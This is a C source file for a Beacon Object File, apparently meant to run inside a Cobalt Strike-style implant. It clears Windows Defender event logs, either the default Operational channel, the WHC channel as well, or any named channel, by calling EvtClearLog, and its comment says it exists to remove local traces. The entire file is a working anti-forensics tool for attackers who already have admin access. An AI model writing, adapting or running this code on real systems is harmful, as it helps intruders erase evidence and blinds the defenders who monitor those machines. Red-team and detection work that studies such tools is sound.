/*
 * bof-clearmplog [channel | all]
 *
 * Clear Windows Defender event logs with EvtClearLog.  Default channel:
 *   Microsoft-Windows-Windows Defender/Operational
 * `all` also clears the WHC channel.  An explicit channel name is accepted.
 *
 * Requires admin.  Clearing a log is itself a security-relevant action and
 * may be recorded by other channels/SIEM, so this only removes local traces.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static void clear_one(const char *channel)
{
    wchar_t wc[512];
    BOOL ok;

    if (bof_a2w(channel, wc, 512) <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "channel name too long\n");
        return;
    }
    ok = WEVTAPI$EvtClearLog(NULL, wc, NULL, 0);
    if (ok)
        BeaconPrintf(CALLBACK_OUTPUT, "[+] cleared %s\n", channel);
    else
        BeaconPrintf(CALLBACK_ERROR, "[-] %s: %lu\n", channel,
                     (unsigned long)KERNEL32$GetLastError());
}

void go(char *args, int alen)
{
    datap parser;
    char *which = "";
    int wlen = 0;

    BeaconDataParse(&parser, args, alen);
    which = BeaconDataExtract(&parser, &wlen);
    if (!which) which = "";

    BeaconPrintf(CALLBACK_OUTPUT, "================ clear Defender log ================\n");

    if (!which[0]) {
        clear_one("Microsoft-Windows-Windows Defender/Operational");
    } else if (bof_stricmp(which, "all") == 0) {
        clear_one("Microsoft-Windows-Windows Defender/Operational");
        clear_one("Microsoft-Windows-Windows Defender/WHC");
    } else {
        clear_one(which);
    }

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] done (requires admin; remote/SIEM copies are unaffected)\n");
}
